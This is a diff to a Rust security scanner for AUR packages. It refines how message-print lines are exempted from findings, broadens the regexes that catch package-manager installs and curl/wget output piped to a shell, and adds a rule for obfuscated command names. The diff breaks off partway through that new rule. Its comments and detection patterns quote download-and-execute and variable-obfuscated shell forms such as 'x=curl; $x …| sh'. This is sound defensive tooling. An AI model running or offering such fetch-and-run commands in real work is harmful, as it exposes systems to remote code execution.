@@ -2,6 +2,7 @@
 
 mod loader;
 pub mod shadow;
+mod supplemental;
 
 pub use loader::RuleLoader;
 pub use shadow::{ShadowDef, ShadowSet};
@@ -16,6 +17,20 @@ use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
 use std::collections::{HashMap, HashSet};
 use std::path::Path;
+
+/// A statement start: beginning of the line, a separator, an opening group or a
+/// control word. Unlike `CMD_START` it does not accept plain whitespace, so the
+/// expansion has to be the command word itself.
+const DYN_STMT_START: &str = r"(?:^|[;&|(){`]|\b(?:then|do|else))\s*";
+
+/// A command word the resolver could not fold: substring, replace, strip or
+/// case-change operators, a non-zero array subscript, or a `$(echo|printf|tr …)`
+/// pipeline. Default-value forms (`${CC:-gcc}`) and whole arrays
+/// (`"${CMAKE[@]}"`) are deliberately absent.
+const DYN_WORD: &str = r#""?(?:\$\{[A-Za-z_][A-Za-z0-9_]*(?:\[[1-9][0-9]*\])?(?::[0-9\s]|//|/|##?|%%?|,,?|\^\^?)[^}]*\}|\$\{[A-Za-z_][A-Za-z0-9_]*\[[1-9][0-9]*\]\}|\$\((?:echo|printf|tr|rev|base64|xxd|cut|sed|awk)\b[^)]*\))"?"#;
+
+/// A positional parameter used as the command (`"$1" -fsSL URL | bash`).
+const DYN_POSITIONAL: &str = r#""?\$(?:[1-9]|\{[1-9]\})"?"#;
 
 /// A security detection rule (pattern-based). Community rule files use this
 /// shape; `file_types`/`patterns` default to empty so a rule file is concise.
@@ -49,7 +64,7 @@ pub struct Rule {
     #[serde(default = "default_true")]
     pub enabled: bool,
     /// Opt out of the case-insensitive default for this rule's regex patterns.
-    /// Rules are compiled `(?i)` by default (audit HI-6) so trivial case variation
+    /// Rules are compiled `(?i)` by default so trivial case variation
     /// (`CURL`, `Wget`) cannot evade them; set this `true` for rules keyed on
     /// canonical casing -- environment-variable NAMEs (case-sensitive in bash),
     /// base64/base32 alphabets, or `\xHH` hex assembly -- where folding the case
@@ -140,8 +155,9 @@ fn compile_regex(pattern: &str, case_sensitive: bool) -> Result<Regex> {
 
 impl CompiledPattern {
     /// Compile a pattern. `case_sensitive` is the owning rule's opt-out flag: when
-    /// `false` (the default) regex patterns compile case-insensitively (audit
-    /// HI-6). `Pattern::Literal` carries its own per-pattern `case_sensitive`.
+    /// `false` (the default) regex patterns compile case-insensitively, so
+    /// trivial case variation cannot evade a rule. `Pattern::Literal` carries its
+    /// own per-pattern `case_sensitive`.
     pub fn compile(pattern: &Pattern, case_sensitive: bool) -> Result<Self> {
         match pattern {
             Pattern::Regex { pattern } => {
@@ -349,7 +365,7 @@ impl RuleEngine {
         // obfuscated `bun add` fires ATOMIC-002). `None` for un-obfuscated lines,
         // so ordinary quoted strings are not re-matched.
         let deobf: Vec<Option<String>> = lines.iter().map(|(_, s)| deobfuscate(s)).collect();
-        // Variable-resolution variant (the static taint pass, audit HI-6): a
+        // Variable-resolution variant (the static taint pass): a
         // payload hidden behind a shell variable (`x=curl; $x …| sh`,
         // `c=$(printf '\x63url'); $c`) evades token matching. `resolve_variables`
         // substitutes statically-evident assignments and is line-count-preserving,
@@ -370,8 +386,15 @@ impl RuleEngine {
         // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
         // executed, so low-risk path-presence rules must not match them. A
         // heredoc fed to an interpreter, or redirected to a file, is still code.
-        let informational = informational_lines_with(&line_strs, shadowed);
+        let ctx = if file_type == FileType::Pkgbuild {
+            MsgContext::Pkgbuild
+        } else {
+            MsgContext::Scriptlet
+        };
+        let informational = inert_kinds_with(&line_strs, shadowed, ctx);
 
+        // One Medium mention per exempt message line, however many High+ rules hit.
+        let mut mention_at: Vec<Option<usize>> = vec![None; lines.len()];
         for compiled in rules {
             for (idx, (phys_line, line)) in lines.iter().enumerate() {
                 // Skip pure comment lines and printed heredoc bodies. A heredoc
@@ -380,7 +403,43 @@ impl RuleEngine {
                 // interpreter (`bash <<EOF`) is NOT informational and is scanned
                 // here, so executable payloads hidden in a heredoc are caught.
                 let trimmed = line.trim();
-                if trimmed.starts_with('#') || informational[idx] {
+                if trimmed.starts_with('#') {
+                    continue;
+                }
+                if informational[idx] == Inert::Message && compiled.rule.severity <= Severity::High
+                {
+                    // Exempt one-literal message: a High/Critical hit is reported
+                    // as a Medium mention naming the rule(s), not as the rule.
+                    let hit = compiled.compiled_patterns.iter().any(|p| {
+                        self.match_pattern(p, line, &compiled.rule).is_some()
+                            || deobf[idx]
+                                .as_deref()
+                                .is_some_and(|d| self.match_pattern(p, d, &compiled.rule).is_some())
+                            || resolved[idx]
+                                .as_deref()
+                                .is_some_and(|r| self.match_pattern(p, r, &compiled.rule).is_some())
+                    });
+                    if hit {
+                        match mention_at[idx] {
+                            Some(m) => {
+                                matches[m].matched_text.push(',');
+                                matches[m].matched_text.push_str(&compiled.rule.id);
+                            }
+                            None => {
+                                mention_at[idx] = Some(matches.len());
+                                matches.push(RuleMatch {
+                                    rule_id: MESSAGE_MENTION_ID.to_string(),
+                                    line: *phys_line,
+                                    column: 0,
+                                    matched_text: compiled.rule.id.clone(),
+                                    context: line.clone(),
+                                });
+                            }
+                        }
+                    }
+                    continue;
+                }
+                if informational[idx].suppresses(compiled.rule.severity) {
                     continue;
                 }
 
@@ -494,10 +553,21 @@ impl Default for RuleEngine {
     }
 }
 
+/// `tracing` target for the warnings the library also prints to stderr.
+///
+/// Rule- and IOC-loading problems are printed unconditionally, so a broken rule
+/// file can never fail quietly. They are emitted as `tracing` events under this
+/// target as well, so an embedder can collect them. A program that installs a
+/// subscriber which writes to stderr should turn this target off
+/// (`aur_scanner_core::loud=off`), or it prints each warning twice.
+pub const LOUD_LOG_TARGET: &str = "aur_scanner_core::loud";
+
 /// Print a loud, stable-prefixed rule-loading warning to stderr (never stdout:
-/// stdout carries machine-readable output).
+/// stdout carries machine-readable output), and emit it under
+/// [`LOUD_LOG_TARGET`].
 pub(crate) fn warn_rule(msg: &str) {
     eprintln!("aur-scan: warning: {msg}");
+    tracing::warn!(target: LOUD_LOG_TARGET, "{msg}");
 }
 
 /// Ids a community rule may never take: every built-in rule and every
@@ -565,46 +635,272 @@ pub fn user_rule_dirs_for(privileged: bool) -> Vec<std::path::PathBuf> {
     dirs
 }
 
-/// Flag each line that is printed text rather than executed code -- the body of
-/// a non-redirected heredoc, or a single-line pure message print (`echo`/`note`/
-/// `msg "..."`) -- so path/string-presence rules don't match user-facing
-/// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
-/// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
-/// one. This was a real false positive on google-chrome / vscode.)
-///
-/// `pub(crate)` so structural analyzers can share the exact same pre-filter: the
-/// privilege analyzer routes function bodies through it so a printed
-/// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
-/// Critical false positive (defect #5).
-pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
-    // File-local view: a printer redefined in these very lines is not inert.
-    // Callers that can see the whole package use `informational_lines_with` and
-    // pass the package-wide set (a redefinition may live in another file).
-    let local = ShadowSet::from_text(&lines.join("\n")).names();
-    informational_lines_with(lines, &local)
+/// Where a line runs, which decides which print commands exist there. makepkg
+/// defines `msg`, `msg2`, `plain`, `warning` and `error` for a PKGBUILD; an
+/// install scriptlet or sidecar runs under a plain shell where only the
+/// builtins `echo` and `printf` are guaranteed, so `msg "..."` there is a call
+/// to a command nobody defined (and `command_not_found_handle` could be it).
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub(crate) enum MsgContext {
+    /// The PKGBUILD itself, run by makepkg.
+    Pkgbuild,
+    /// An install scriptlet, hook helper or sidecar script.
+    Scriptlet,
 }
 
-/// [`informational_lines`] with the set of printer names the package redefines
-/// into something that can execute (see [`ShadowSet::names`]). Those names are
-/// code, never inert text, in every file of the package.
-pub(crate) fn informational_lines_with(lines: &[&str], shadowed: &HashSet<String>) -> Vec<bool> {
-    let mut flags = vec![false; lines.len()];
-    let mut terminator: Option<String> = None;
-    for (i, line) in lines.iter().enumerate() {
-        if let Some(delim) = &terminator {
-            flags[i] = true; // inside a printed heredoc body
-            if line.trim() == delim.as_str() {
-                terminator = None;
-            }
-            continue;
-        }
-        if let Some(delim) = heredoc_message_delim(line, shadowed) {
-            terminator = Some(delim);
-        } else if is_pure_message_print(line, shadowed) {
-            flags[i] = true;
+impl MsgContext {
+    /// The context of the file at `path` (only a file named `PKGBUILD`).
+    pub(crate) fn for_path(path: &std::path::Path) -> Self {
+        if path.file_name().and_then(|n| n.to_str()) == Some("PKGBUILD") {
+            MsgContext::Pkgbuild
+        } else {
+            MsgContext::Scriptlet
         }
     }
-    flags
+
+    fn allows(self, cmd: &str) -> bool {
+        match cmd {
+            "echo" | "printf" => true,
+            "msg" | "msg2" | "plain" | "warning" | "error" => self == MsgContext::Pkgbuild,
+            _ => false,
+        }
+    }
+}
+
+/// Why a line is considered printed text rather than executed code.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub(crate) enum Inert {
+    /// Ordinary code.
+    Code,
+    /// A single-line pure message print (`echo "..."`, `note "..."`).
+    Print,
+    /// A one-line print that is nothing but a printer name and ONE literal string
+    /// (see [`strict_message_line`]) on a package where nothing can re-route a
+    /// printer, with the lexer certain and clean around it. The only kind that
+    /// may hide a High or Critical finding; the rule engine reports it as a
+    /// Medium [`MESSAGE_MENTION_ID`] finding instead.
+    Message,
+    /// Body of a heredoc that only prints. This depends on the lexer having
+    /// followed quotes, comments and expansions correctly up to that point.
+    Heredoc,
+}
+
+impl Inert {
+    /// Whether a finding of severity `sev` on a line of this kind is dropped.
+    ///
+    /// The ONE place suppression is decided. A heredoc body is only ever hidden
+    /// from findings below High: the lexer behind it can be desynced on purpose,
+    /// so it must never be able to hide a High or Critical finding. Every
+    /// analyzer and the rule engine route through this, so a new rule or analyzer
+    /// cannot opt out by accident.
+    pub(crate) fn suppresses(self, sev: Severity) -> bool {
+        match self {
+            Inert::Code => false,
+            // Neither kind hides High or Critical findings. A one-line print is
+            // decided by modelling the shell (quote state carried from earlier
+            // lines, `<( )` / `$'..'` forms, redefined printers, wrappers that
+            // evaluate their argument arithmetically, DEBUG traps ...), and every
+            // such model has leaked, so no model sits on the High+ path.
+            Inert::Print | Inert::Heredoc => sev > Severity::High,
+            // Narrow exemption: a bare one-literal print cannot run
+            // anything, and the shell cannot have been re-routed (checked for
+            // the whole package), so even High findings on it are only a
+            // mention.
+            Inert::Message => true,
+        }
+    }
+}
+
+/// Classify each line as code, a pure message print, or the body of a printing
+/// heredoc, so path/string-presence rules don't match user-facing messages.
+/// (E.g. a `.install` that says `note "put flags in ~/.config/x"` must not trip
+/// the "hidden file in home" rule: it mentions a path, it doesn't write one. This
+/// was a real false positive on google-chrome / vscode.) See [`Inert::suppresses`]
+/// for what each kind may hide.
+#[cfg(test)]
+pub(crate) fn inert_kinds(lines: &[&str]) -> Vec<Inert> {
+    // File-local view: a printer redefined in these very lines is not inert.
+    // Callers that can see the whole package use `inert_kinds_with` and pass the
+    // package-wide set (a redefinition may live in another file).
+    let local = ShadowSet::from_text(&lines.join("\n")).names();
+    inert_kinds_with(lines, &local, MsgContext::Scriptlet)
+}
+
+/// [`inert_kinds`] with the set of printer names the package redefines into
+/// something that can execute (see [`ShadowSet::names`]). Those names are code,
+/// never inert text, in every file of the package.
+pub(crate) fn inert_kinds_with(
+    lines: &[&str],
+    shadowed: &HashSet<String>,
+    ctx: MsgContext,
+) -> Vec<Inert> {
+    let mut kinds = vec![Inert::Code; lines.len()];
+    let cls = crate::textutil::classify_lines(lines);
+    let mut in_body = vec![false; lines.len()];
+    for h in &cls.heredocs {
+        for flag in in_body.iter_mut().take(h.end + 1).skip(h.body_start) {
+            *flag = true;
+        }
+        // Past a construct the lexer could not follow, nothing is inert.
+        if cls.uncertain_from.is_some_and(|u| h.open_line >= u) {
+            continue;
+        }
+        if !heredoc_is_printed(lines[h.open_line], h, shadowed) {
+            continue;
+        }
+        for k in h.body_start..=h.end {
+            // An UNQUOTED heredoc still expands `$(..)`, backticks and
+            // `${x:=$(..)}`: a body line with a live substitution is code.
+            let code = !h.opener.quoted && k < h.end && has_live_substitution(lines[k]);
+            if !code {
+                kinds[k] = Inert::Heredoc;
+            }
+        }
+    }
+    let exemption_on = !shadowed.contains(shadow::EXEMPTION_BLOCKED);
+    for (i, line) in lines.iter().enumerate() {
+        if in_body[i] {
+            continue;
+        }
+        if exemption_on && strict_message_ok(&cls, i) && strict_message_line(line, ctx) {
+            kinds[i] = Inert::Message;
+        } else if is_pure_message_print(line, shadowed) {
+            kinds[i] = Inert::Print;
+        }
+    }
+    kinds
+}
+
+/// Id of the Medium finding that replaces High/Critical matches on an exempt
+/// message line.
+pub(crate) use crate::analyzer::pattern::MESSAGE_MENTION_ID;
+
+/// The Medium finding for an exempt message line that mentions something a
+/// High/Critical rule would flag. `matched` is the rule id(s). Column and
+/// snippet are fixed so the same line reported by two analyzers is one finding.
+pub(crate) fn message_mention_finding(
+    file: &std::path::Path,
+    line: usize,
+    snippet: &str,
+    matched: &str,
+    kind: &str,
+) -> crate::types::Finding {
+    use crate::types::{Category, Finding, Location};
+    Finding {
+        id: MESSAGE_MENTION_ID.to_string(),
+        severity: Severity::Medium,
+        category: Category::SuspiciousMetadata,
+        title: "Install message mentions a privileged command".to_string(),
+        description: format!(
+            "A one-line message print mentions something that would be a {matched} finding if it were a command. It is a bare literal string on a package where no printer is redefined, so it only tells the user what to run."
+        ),
+        location: Location {
+            file: file.to_path_buf(),
+            line: Some(line),
+            column: None,
+            snippet: Some(snippet.to_string()),
+        },
+        recommendation: "Confirm the message only describes a step for the user.".to_string(),
+        cwe_id: None,
+        metadata: serde_json::json!({ "matched_rule": matched, "script_kind": kind }),
+    }
+}
+
+/// The exempt message lines of `content` (logical lines, with the 1-based line
+/// each starts on).
+pub(crate) fn message_lines(
+    content: &str,
+    shadowed: &HashSet<String>,
+    ctx: MsgContext,
+) -> Vec<(usize, String)> {
+    let lines = crate::textutil::logical_lines(content);
+    let strs: Vec<&str> = lines.iter().map(|(_, l)| l.as_str()).collect();
+    let kinds = inert_kinds_with(&strs, shadowed, ctx);
+    lines
+        .into_iter()
+        .zip(kinds)
+        .filter(|(_, k)| *k == Inert::Message)
+        .map(|(l, _)| l)
+        .collect()
+}
+
+/// Condition (c): the lexer is certain, and no quote, substitution, array or
+/// pending continuation is open at the start or end of line `i` or left over
+/// from the previous line.
+fn strict_message_ok(cls: &crate::textutil::Classified, i: usize) -> bool {
+    if cls.uncertain_from.is_some_and(|u| i >= u) {
+        return false;
+    }
+    let Some(Some(s)) = cls.scans.get(i) else {
+        return false;
+    };
+    if s.uncertain || s.open_at_start || s.open_at_end || s.depth_at_start != 0 || s.continues {
+        return false;
+    }
+    match i.checked_sub(1).and_then(|p| cls.scans.get(p)) {
+        Some(Some(p)) => !(p.continues || p.ends_op || p.open_at_end),
+        _ => true,
+    }
+}
+
+/// Conditions (a) and (b): the line is a bare printer name followed by exactly
+/// one quoted string literal and nothing else but whitespace or a comment.
+///   * the command word is exactly `echo`, `printf`, `msg`, `msg2`, `plain`,
+///     `warning`, `error` or `note` (no path, no prefix, no flags);
+///   * `'...'`, or `"..."` containing no `$`, no backtick and no backslash
+///     other than `\"` and `\\`;
+///   * no redirection, pipe, `<(`, `;`, `&`.
+pub(crate) fn strict_message_line(line: &str, ctx: MsgContext) -> bool {
+    let t = line.trim();
+    let Some((cmd, rest)) = t.split_once([' ', '\t']) else {
+        return false;
+    };
+    if !ctx.allows(cmd) {
+        return false;
+    }
+    let b = rest.trim_start().as_bytes();
+    let Some(&q) = b.first() else {
+        return false;
+    };
+    let mut i = 1;
+    match q {
+        b'\'' => {
+            while i < b.len() && b[i] != b'\'' {
+                i += 1;
+            }
+        }
+        b'"' => {
+            while i < b.len() && b[i] != b'"' {
+                match b[i] {
+                    b'$' | b'`' => return false,
+                    b'\\' => {
+                        if !matches!(b.get(i + 1), Some(b'"') | Some(b'\\')) {
+                            return false;
+                        }
+                        i += 1;
+                    }
+                    _ => {}
+                }
+                i += 1;
+            }
+        }
+        _ => return false,
+    }
+    if i >= b.len() {
+        return false; // unterminated on this line
+    }
+    let tail = std::str::from_utf8(&b[i + 1..]).unwrap_or("x");
+    let tail_t = tail.trim_start();
+    tail_t.is_empty() || (tail.starts_with([' ', '\t']) && tail_t.starts_with('#'))
+}
+
+/// Whether a heredoc body line holds an unescaped `$(` or backtick.
+fn has_live_substitution(line: &str) -> bool {
+    let b = line.as_bytes();
+    (0..b.len()).any(|i| {
+        let hit = b[i] == b'`' || (b[i] == b'$' && b.get(i + 1) == Some(&b'('));
+        hit && b[..i].iter().rev().take_while(|&&c| c == b'\\').count() % 2 == 0
+    })
 }
 
 /// Whether `line` is a single-line message print whose argument is just text the
@@ -687,53 +983,28 @@ fn has_executable_operator(t: &str) -> bool {
     false
 }
 
-/// If `line` opens a heredoc that just prints a message (no redirection to a
-/// file), return its terminator delimiter. Redirected heredocs write content
-/// somewhere and must still be scanned, so they return `None`.
-fn heredoc_message_delim(line: &str, shadowed: &HashSet<String>) -> Option<String> {
-    let pos = line.find("<<")?;
-    let rest = line[pos + 2..]
-        .strip_prefix('-')
-        .unwrap_or(&line[pos + 2..])
-        .trim_start();
-    let bytes = rest.as_bytes();
-    let quote = match bytes.first() {
-        Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
-        _ => None,
-    };
-    let mut i = if quote.is_some() { 1 } else { 0 };
-    let start = i;
-    while i < bytes.len() {
-        let c = bytes[i];
-        match quote {
-            Some(q) if c == q => break,
-            Some(_) => i += 1,
-            None if c.is_ascii_alphanumeric() || c == b'_' => i += 1,
-            None => break,
-        }
+/// Whether the heredoc opened on `line` only prints a message: the consuming
+/// command is a pure printer (cat/echo/printf), the line is not redirected to a
+/// file and not piped, and it carries a single heredoc operator. Redirected
+/// heredocs write content somewhere and a heredoc fed to an interpreter
+/// (`bash <<EOF`, `ssh host <<EOF`, `cat <<EOF | bash`) runs its body, so those
+/// must be scanned. When unsure, do NOT suppress (fail toward scanning).
+fn heredoc_is_printed(
+    line: &str,
+    h: &crate::textutil::Heredoc,
+    shadowed: &HashSet<String>,
+) -> bool {
+    if h.openers_on_line != 1 {
+        return false;
     }
-    if i == start {
-        return None;
-    }
-    let delim = &rest[start..i];
-    // `$((x << 2))` is an arithmetic shift, not a heredoc.
-    if quote.is_none() && delim.as_bytes()[0].is_ascii_digit() {
-        return None;
-    }
-    // Redirected to a file (`> f`, `>> f`, `| tee f`)? Then it writes content
-    // and the body must be scanned.
+    let (pos, end) = (h.opener.start, h.opener.end.min(line.len()));
     let redirected = line.contains(">>")
         || line[..pos].contains('>')
-        || rest[i..].contains('>')
+        || line[end..].contains('>')
         || line.contains("tee ");
     if redirected {
-        return None;
+        return false;
     }
-    // Only treat the body as printed-not-executed when the consuming command is
-    // a pure printer (cat/echo/printf) AND the heredoc is not piped into another
-    // command. A heredoc fed to an interpreter -- `bash <<EOF`, `python <<EOF`,
-    // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
-    // scanned. When unsure, do NOT suppress (fail toward scanning).
     let before = &line[..pos];
     let last_command = before.rsplit([';', '|', '&', '(']).next().unwrap_or(before);
     // Basename so `/bin/cat` / `/usr/bin/printf` count as pure printers.
@@ -747,17 +1018,19 @@ fn heredoc_message_delim(line: &str, shadowed: &HashSet<String>) -> Option<Strin
         })
         .unwrap_or(false);
     // A pipe anywhere on the opener means the body may be fed to a command.
-    let piped = line.contains('|');
-    if !is_pure_printer || piped {
-        return None;
-    }
-    Some(delim.to_string())
+    is_pure_printer && !line.contains('|')
 }
+
+/// Option groups allowed between a package-manager binary and its
+/// subcommand (`npm --silent install`, `npm --prefix /usr install`, `pip3 -q
+/// install`). A later non-flag word is the subcommand, so `npm --version`
+/// matches nothing.
+const PM_OPTS: &str = r"(?:\s+-{1,2}[\w-]+(?:[= ]\S+)?)*";
 
 /// Get built-in security rules (pattern-based). Public so the catalog can
 /// index them as the single source of truth.
 pub fn get_builtin_rules() -> Vec<Rule> {
-    vec![
+    let mut rules = vec![
         // ============================================================
         // CRITICAL: Download and Execute (from real-world attacks)
         // ============================================================
@@ -771,7 +1044,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 // `curl URL [| filter]* | sh`: any filter chain (`| rev |`,
                 // `| base64 -d |`, `| tee x |`) between the fetch and the shell.
                 // Segments are `[^|]+` so a `||` fallback is not a pipe.
-                pattern: format!(r"curl\s+[^|]+(?:\|[^|]+)*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
+                pattern: format!(r"curl\s+[^|]+(?:\|[^|]+)*\|\s*(?:{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b|{})", crate::textutil::pipe_sink_extra()),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -786,7 +1059,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"wget\s+[^|]+(?:\|[^|]+)*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
+                pattern: format!(r"wget\s+[^|]+(?:\|[^|]+)*\|\s*(?:{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b|{})", crate::textutil::pipe_sink_extra()),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -1121,7 +1394,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 // the `cd ./build` argument false positive; requiring an
                 // executable extension removes the `./configure` autotools false
                 // positive (an extensionless build script). Dropped payloads
-                // (`./payload.sh`, `./x/y.bin`) still match (defect #10). An
+                // (`./payload.sh`, `./x/y.bin`) still match. An
                 // extensionless `./name` is intentionally not flagged here
                 // because it is indistinguishable from `./configure`; the
                 // campaign payload vectors are covered by INSTALL-001/003/004,
@@ -1161,16 +1434,17 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
-                Pattern::Regex { pattern: r"\b(pip[23]?|pipx)\s+install\b".to_string() },
-                Pattern::Regex { pattern: r"\bpoetry\s+(add|install)\b".to_string() },
-                Pattern::Regex { pattern: r"\buv\s+(add|sync|pip|tool|run)\b".to_string() },
-                Pattern::Regex { pattern: r"\bpdm\s+(add|install|sync)\b".to_string() },
-                Pattern::Regex { pattern: r"\bconda\s+install\b".to_string() },
-                Pattern::Regex { pattern: r"\bcargo\s+install\b".to_string() },
-                Pattern::Regex { pattern: r"\bgo\s+(install|get)\b".to_string() },
-                Pattern::Regex { pattern: r"\bgem\s+install\b".to_string() },
-                Pattern::Regex { pattern: r"\bcomposer\s+(require|install)\b".to_string() },
-                Pattern::Regex { pattern: r"\bdeno\s+(install|add|run|cache)\b".to_string() },
+                Pattern::Regex { pattern: format!(r"\b(?:pip[23]?|pipx){PM_OPTS}\s+(?:install|run|inject|upgrade)\b") },
+                Pattern::Regex { pattern: format!(r"\bpoetry{PM_OPTS}\s+(?:add|install)\b") },
+                Pattern::Regex { pattern: format!(r"\buv{PM_OPTS}\s+(?:add|sync|pip|tool\s+(?:run|install)|run|x)\b") },
+                Pattern::Regex { pattern: r"\buvx\s+(?:-\S+\s+)*[^\s-]".to_string() },
+                Pattern::Regex { pattern: format!(r"\bpdm{PM_OPTS}\s+(?:add|install|sync)\b") },
+                Pattern::Regex { pattern: format!(r"\bconda{PM_OPTS}\s+install\b") },
+                Pattern::Regex { pattern: format!(r"\bcargo{PM_OPTS}\s+install\b") },
+                Pattern::Regex { pattern: format!(r"\bgo{PM_OPTS}\s+(?:install|get)\b") },
+                Pattern::Regex { pattern: format!(r"\bgem{PM_OPTS}\s+install\b") },
+                Pattern::Regex { pattern: format!(r"\bcomposer{PM_OPTS}\s+(?:require|install)\b") },
+                Pattern::Regex { pattern: format!(r"\bdeno{PM_OPTS}\s+(?:install|add|run|cache)\b") },
             ],
             file_types: vec![FileType::InstallScript],
             recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
@@ -1788,7 +2062,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 // does NOT match a /tmp path used as an assignment value or a
                 // plain argument (`TMPDIR=/tmp/x`, `mktemp -d /tmp/x`, `cp foo
                 // /tmp/x`, `> /tmp/x`), which are benign and were the source of
-                // false positives (defect #10).
+                // false positives.
                 Pattern::Regex {
                     pattern: format!(
                         r"(?:^|[;&|]|\b(?:exec|source|eval|{SHELLS}|python[23]?|perl|ruby|node|php)\s+)\s*\.?/tmp/\S+"
@@ -1846,7 +2120,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             // Env-var NAMEs are case-sensitive in bash, and `/etc/ld.so.preload`
             // is a fixed lowercase path: a lowercase `ld_preload=` does NOT set
             // the real variable, so matching case-insensitively would only add
-            // false positives without catching any real attack (audit HI-6 caveat).
+            // false positives without catching any real attack.
             case_sensitive: true,
         },
         Rule {
@@ -1869,7 +2143,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             enabled: true,
             // `PATH` is a canonical upper-case env-var NAME; a lowercase `path=`
             // is an ordinary local variable, so keep this case-sensitive to avoid
-            // false positives (audit HI-6 caveat).
+            // false positives.
             case_sensitive: true,
         },
         Rule {
@@ -2013,21 +2287,28 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 // `explore <pkg> -- cmd` runs an arbitrary command in a package
                 // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
-                        .to_string(),
+                    pattern: format!(
+                        r"\b(?:npm|pnpm|yarn){PM_OPTS}\s+(?:global\s+)?(?:install|add|i|in|ins|inst|insta|instal|isnt|isnta|isntal|isntall|it|cit|ci|install-test|install-ci-test|clean-install|dlx|exec|x|rebuild|explore|up|update|upgrade|link|ln)\b"
+                    ),
                 },
-                // `bun` subcommands (NOT `bunx`, which is the runner below — the
-                // `\s+` after `bun` excludes `bunx`).
+                // `node /usr/lib/node_modules/npm/bin/npm-cli.js install pkg`
                 Pattern::Regex {
-                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
+                    pattern: format!(
+                        r"\bnode\s+\S*(?:npm|pnpm|yarn)(?:-cli)?\.[cm]?js{PM_OPTS}\s+(?:global\s+)?(?:install|add|i|in|ins|inst|insta|instal|isnt|isnta|isntal|isntall|it|cit|ci|install-test|install-ci-test|dlx|exec|x|rebuild|explore|up|update|upgrade)\b"
+                    ),
+                },
+                // `bun` subcommands (NOT `bunx`, which is the runner below -- the
+                // `\s+` after `bun` excludes `bunx`), flags allowed first.
+                Pattern::Regex {
+                    pattern: format!(
+                        r"\bbun{PM_OPTS}\s+(?:install|add|a|i|x|update|up|link|exec)\b"
+                    ),
                 },
                 // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
-                // fetch and run a package directly (no subcommand) — the most
-                // common fetch-and-run RCE, and the exact form the old
-                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
-                // missed. A bare runner followed by any argument is the attack.
+                // fetch and run a package directly (no subcommand). A bare runner
+                // followed by any non-flag argument is the attack.
                 Pattern::Regex {
-                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
+                    pattern: r"\b(?:npx|bunx|pnpx)\s+(?:-\S+\s+)*[^\s-]".to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
@@ -2489,7 +2770,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             // pinned case-exact with `(?-i:…)`: pip/go read only the upper-case
             // env var, so a lower-case `pip_index_url=`/`goproxy=` is an inert
             // local variable and matching it would be a false positive
-            // (audit HI-6 env-NAME caveat; the rest of the env-NAME family is
+            // (the env-NAME caveat; the rest of the env-NAME family is
             // handled rule-level via `case_sensitive`).
             patterns: vec![Pattern::Regex { pattern: r"(--index-url|--extra-index-url|(?-i:PIP_INDEX_URL)=|npm_config_registry=|--registry\s+https?|(?-i:GOPROXY)=|--default-registry)".to_string() }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -2558,6 +2839,23 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             enabled: true,
             case_sensitive: false,
         },
+        Rule {
+            id: "OBF-020".to_string(),
+            name: "Dynamic command name".to_string(),
+            description: "The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), \"$1\") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or \"${CMAKE[@]}\" are not matched.".to_string(),
+            severity: Severity::High,
+            category: Category::Obfuscation,
+            patterns: vec![
+                Pattern::Regex { pattern: format!(r"{DYN_STMT_START}(?:{DYN_WORD}|{DYN_POSITIONAL})\S*(?:\s+\S+)*?\s+https?://\S+.*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b") },
+                Pattern::Regex { pattern: format!(r"https?://\S+.*\|\s*(?:{DYN_WORD})(?:\s|$)") },
+                Pattern::Regex { pattern: format!(r"{DYN_STMT_START}{DYN_WORD}\s+(?:install|add|i|in|a)\b") },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the line; the command being run is assembled at run time to avoid matching.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
